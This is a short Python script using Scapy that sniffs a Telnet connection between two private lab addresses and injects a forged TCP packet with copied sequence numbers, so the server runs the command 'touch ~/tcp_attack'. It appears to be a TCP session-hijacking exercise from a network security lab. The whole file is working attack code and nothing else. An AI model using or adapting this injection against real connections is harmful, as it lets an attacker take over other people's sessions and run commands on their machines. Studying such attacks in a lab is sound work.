#!/usr/bin/env python

import sys
from scapy.all import *

def spoof(pkt):
  header_len = 4 * (pkt[IP].ihl+pkt[TCP].dataofs)
  if pkt[IP].len != header_len:
    return
  src = pkt[IP].src
  dst = pkt[IP].dst
  sport = pkt[TCP].sport
  dport = pkt[TCP].dport
  seq = pkt[TCP].seq
  ack = pkt[TCP].ack

  ip = IP(src=src, dst=dst)
  tcp = TCP(sport=sport, dport=dport, flags="PA", ack=ack, seq=seq)
  data = "\r touch ~/tcp_attack \r"
  send(ip/tcp/data, iface="enp0s3")
  sys.exit()
  
if __name__ == "__main__":
  filter_str = "src host 10.0.2.4 and dst host 10.0.2.5 and dst port 23"
  sniff(filter=filter_str, prn=spoof)
